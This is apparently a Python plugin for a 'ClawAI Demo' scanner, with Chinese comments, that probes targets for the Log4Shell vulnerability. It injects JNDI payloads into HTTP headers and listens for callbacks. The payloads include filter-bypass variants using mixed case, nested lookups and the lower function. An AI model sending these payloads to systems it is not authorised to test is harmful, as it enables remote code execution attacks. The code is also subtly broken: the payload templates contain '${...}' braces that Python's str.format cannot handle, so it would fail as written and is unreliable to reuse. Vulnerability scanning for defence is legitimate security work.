# -*- coding: utf-8 -*-
"""
Log4Shell 漏洞检测插件 - ClawAI Demo
CVE-2021-44228 / CVE-2021-45046 / CVE-2021-45105

通过向 HTTP 请求头注入 JNDI Payload 并监听回调，检测服务器是否存在 Log4Shell 漏洞。
支持内置轻量 HTTP 回调监听（不依赖外部 DNSLOG 服务）。
"""

import uuid
import time
import threading
import logging
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Any, Dict, List, Optional

logger = logging.getLogger("clawai.plugin.log4shell_scanner")


# ── JNDI Payload 模板库 ───────────────────────────────────────────────────────
_JNDI_PAYLOADS = [
    # 基础 LDAP
    "${jndi:ldap://{callback}/{id}}",
    # 大小写混淆（绕过简单过滤）
    "${JnDi:lDaP://{callback}/{id}}",
    # 嵌套表达式绕过（CVE-2021-45046 场景）
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{callback}/{id}}",
    # lower 函数混淆
    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://{callback}/{id}}",
    # RMI 协议
    "${jndi:rmi://{callback}/{id}}",
    # DNS 查询（仅用于检测，不触发 RCE）
    "${jndi:dns://{callback}/{id}}",
]

# 常见被日志记录的请求头
_DEFAULT_HEADERS = [
    "User-Agent", "X-Forwarded-For", "Referer",
    "X-Api-Version", "Accept-Language", "X-Forwarded-Host",
]


class _CallbackHandler(BaseHTTPRequestHandler):
    """轻量 HTTP 回调服务，记录收到的请求路径"""
    received_ids = set()

    def do_GET(self):
        path = self.path.lstrip("/")
        _CallbackHandler.received_ids.add(path)
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass  # 静默日志


class ClawAIPlugin:
    plugin_id: str = ""

    def run(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        raise NotImplementedError

    def health_check(self) -> Dict[str, Any]:
        return {"ok": True, "message": "ready"}

    def _finding(self, title, severity, description, location="", evidence="",
                 remediation="", cve="") -> Dict[str, Any]:
        return {
            "type": self.plugin_id,
            "title": title,
            "severity": severity,
            "description": description,
            "location": location,
            "evidence": evidence,
            "remediation": remediation,
            "cve": cve,
            "source": f"plugin:{self.plugin_id}",
        }


class Log4ShellScannerPlugin(ClawAIPlugin):
    """Log4Shell 专项检测插件"""

    plugin_id = "log4shell_scanner"

    # CVSS: 10.0 / Critical
    _REMEDIATION = (
        "1. 立即升级 Log4j 至 2.17.1+（Java 8）/ 2.12.4+（Java 7）/ 2.3.2+（Java 6）。\n"
        "2. 临时缓解：设置 JVM 参数 -Dlog4j2.formatMsgNoLookups=true（仅适用于 2.10+）。\n"
        "3. 在 WAF/IDS 层添加 JNDI 注入规则，过滤 ${jndi:... 等特征字符串。\n"
        "4. 评估并关闭不必要的出站网络连接，特别是 LDAP/RMI 端口（389/1099）。\n"
        "5. 参考 Apache 官方安全公告：https://logging.apache.org/log4j/2.x/security.html"
    )

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        self.config = config or {}
        self.callback_server = self.config.get("callback_server", "")
        self.inject_headers = self.config.get("inject_headers", _DEFAULT_HEADERS)
        self.check_variants = self.config.get("check_variants", True)
        self.timeout = self.config.get("timeout", 15)
        self._callback_port = None
        self._httpd = None

    def run(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings = []

        # 确定回调地址
        callback_host = self._setup_callback()
        if not callback_host:
            logger.warning("[log4shell] 无法启动回调服务，跳过检测")
            return findings

        session = context.get("http_session")
        if not session:
            logger.warning("[log4shell] 缺少 http_session，无法发送请求")
            return findings

        # 为每个 payload 生成唯一追踪 ID
        tests = []
        for payload_tmpl in _JNDI_PAYLOADS:
            uid = uuid.uuid4().hex[:12]
            payload = payload_tmpl.format(callback=callback_host, id=uid)
            tests.append((uid, payload))

        # 向目标注入 Payload
        for header in self.inject_headers:
            for uid, payload in tests:
                try:
                    session.get(target, headers={header: payload}, timeout=5)
                except Exception:
                    pass  # 连接错误不影响检测（可能是目标已崩溃）

        # 等待回调
        logger.info(f"[log4shell] 已注入 {len(tests)} 个 Payload，等待 {self.timeout}s 回调...")
        deadline = time.time() + self.timeout
        triggered_ids = set()
        while time.time() < deadline:
            for uid, _ in tests:
                if uid in _CallbackHandler.received_ids:
                    triggered_ids.add(uid)
            if triggered_ids:
                break
            time.sleep(0.5)

        self._stop_callback()

        if triggered_ids:
            # 找出触发的 payload
            triggered = [(uid, p) for uid, p in tests if uid in triggered_ids]
            evidence_lines = [f"触发 Payload: {p}  (id={uid})" for uid, p in triggered[:3]]
            findings.append(self._finding(
                title="Log4Shell RCE 漏洞（CVE-2021-44228）",
                severity="critical",
                description=(
                    "目标服务器对注入的 JNDI Payload 发起了回调请求，确认存在 Log4Shell 漏洞。"
                    "攻击者可通过此漏洞在目标服务器上执行任意代码，完全控制服务器。"
                ),
                location=target,
                evidence="\n".join(evidence_lines),
                remediation=self._REMEDIATION,
                cve="CVE-2021-44228",
            ))

        elif self.check_variants:
            # 无回调但存在 Log4j 特征时，报告 Low 等级发现
            java_headers = context.get("response_headers", {})
            if any("log4j" in str(v).lower() or "java" in str(v).lower()
                   for v in java_headers.values()):
                findings.append(self._finding(
                    title="疑似 Log4j 环境（无回调确认）",
                    severity="low",
                    description=(
                        "目标响应头中检测到 Java/Log4j 相关特征，但未收到 JNDI 回调。"
                        "可能原因：网络出站规则阻断了 LDAP/RMI 请求，或已部署缓解措施。"
                        "建议手动确认或使用内网 DNSLOG 服务复测。"
                    ),
                    location=target,
                    cve="CVE-2021-44228",
                ))

        return findings

    def _setup_callback(self) -> str:
        """启动内置回调服务，返回监听地址"""
        if self.callback_server:
            return self.callback_server

        try:
            import socket
            # 获取本机 IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()

            # 绑定随机端口
            _CallbackHandler.received_ids.clear()
            self._httpd = HTTPServer(("0.0.0.0", 0), _CallbackHandler)
            self._callback_port = self._httpd.server_address[1]

            t = threading.Thread(target=self._httpd.serve_forever, daemon=True)
            t.start()
            logger.info(f"[log4shell] 回调监听启动: {local_ip}:{self._callback_port}")
            return f"{local_ip}:{self._callback_port}"
        except Exception as e:
            logger.error(f"[log4shell] 启动回调服务失败: {e}")
            return ""

    def _stop_callback(self):
        if self._httpd:
            self._httpd.shutdown()
            self._httpd = None

    def health_check(self) -> Dict[str, Any]:
        return {"ok": True, "message": "log4shell_scanner ready"}


def create_plugin(config=None) -> Log4ShellScannerPlugin:
    return Log4ShellScannerPlugin(config=config)
